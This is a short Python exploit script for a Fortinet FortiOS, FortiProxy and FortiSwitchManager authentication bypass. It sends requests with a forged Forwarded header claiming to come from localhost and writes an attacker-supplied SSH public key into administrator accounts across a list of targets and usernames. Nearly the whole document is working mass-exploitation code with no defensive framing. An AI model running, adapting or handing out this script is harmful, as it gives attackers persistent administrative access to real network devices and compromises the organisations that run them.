'''
An authentication bypass using an alternate path or channel [CWE-288] in Fortinet FortiOS version 7.2.0 through 7.2.1 and 7.0.0 through 7.0.6, FortiProxy version 7.2.0 and version 7.0.0 through 7.0.6 and FortiSwitchManager version 7.2.0 and 7.0.0 allows an unauthenticated atttacker to perform operations on the administrative interface via specially crafted HTTP or HTTPS requests.
'''
import requests
import argparse

# Read the input arguments
parser = argparse.ArgumentParser()
parser.add_argument("-t", "--targets", help="Targets file")
parser.add_argument("-u", "--usernames", help="Usernames file")
parser.add_argument("--key", help="id_rsa.pub file")
args = parser.parse_args()

# Read targets
with open(args.targets, "r") as f:
    targets = f.read().splitlines()

# Read usernames
with open(args.usernames, "r") as f:
    usernames = f.read().splitlines()

# Read id_rsa.pub
with open(args.key, "r") as f:
    ssh_public_key = f.read()

# Prepare headers
headers = {
    'User-Agent': 'Report Runner',
    'Content-Type': 'application/json',
    'Forwarded': 'for="[127.0.0.1]:8000";by="[127.0.0.1]:9000";'
}

# Prepare data
data = {
    "ssh-public-key1": ssh_public_key
}

for target in targets:
    for username in usernames:
        url = f"{target}/api/v2/cmdb/system/admin/{username}"
        response = requests.put(url, headers=headers, json=data)
        if response.status_code == 200 and 'SSH' in response.text:
            print(f"[+] Successful exploit for {username} at {url}")
        else:
            print(f"[-] Failed exploit for {username} at {url}")